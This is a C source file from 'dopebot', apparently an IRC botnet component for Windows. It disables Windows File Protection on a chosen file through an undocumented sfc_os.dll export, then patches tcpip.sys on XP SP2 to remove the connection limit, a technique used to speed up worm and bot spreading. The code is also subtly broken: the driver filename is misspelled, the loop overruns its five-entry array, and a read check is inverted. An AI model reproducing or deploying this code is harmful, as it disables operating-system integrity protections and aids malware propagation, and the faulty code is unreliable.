/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_SFC
#include "bot.h"

//Disables SFC On Specified File For 60seconds
//Thanks To Ratter Of 29/A For The Research
bool disable_sfc(char *szFile)
{
	typedef DWORD (*SFPEXC)(DWORD, wchar_t *, DWORD);
	HMODULE sfc_os;
	SFPEXC sfp_exc;

#ifndef NO_DEBUG
			printf("[DEBUG] Disabling SFC, disable_sfc()...\n");
#endif

		sfc_os = LoadLibrary("sfc_os.dll");
		sfp_exc = (SFPEXC)GetProcAddress(sfc_os, (char *)5);
	if (!sfp_exc(0, (wchar_t *)szFile, -1)) return FALSE;
	else return TRUE;
}

bool patch_tcpip()
{
	char szBuffer[LOWBUF], szByte[32], szPath[MAX_PATH], szSysDir[MAX_PATH];
	FILE *f;
	int i; 
	struct bytelist { int offset; char *value; };
	bytelist bytes[5] =
	{
			{0x00130, "\x62"},
			{0x00131, "\x13"},
			{0x4F322, "\xFE"},
			{0x4F323, "\xFF"},
			{0x4F324, "\xFF"},
	};
	if (!is_osnt()) return FALSE;
		get_os(szBuffer);
	if (strstr(szBuffer, "Windows XP Service Pack 2") != NULL)
	{
#ifndef NO_DEBUG
			printf("[DEBUG] Patching TCPIP.SYS (XP SP), patch_tcpip()...\n");
#endif

			GetSystemDirectory(szSysDir, sizeof(szSysDir));
			sprintf(szPath, "%s\\drivers\\tcipip.sys", szSysDir);
			disable_sfc(szPath);
			f = fopen(szPath, "r+b");
		if (f == NULL) return FALSE;
		for (i = 0; i < 10; i++)
		{
			if (fseek(f, bytes[i].offset, SEEK_SET) != 0) return FALSE;
			if (fread(szByte, 1, 1, f) != 0) return FALSE;
			if (lstrcmpi(szByte, bytes[i].value)) return FALSE; 
			if (fwrite(&bytes[i].value, 1, 1, f) != 1) return FALSE;
		}
			fclose(f);
			return TRUE;
	}
		return FALSE;
}
#endif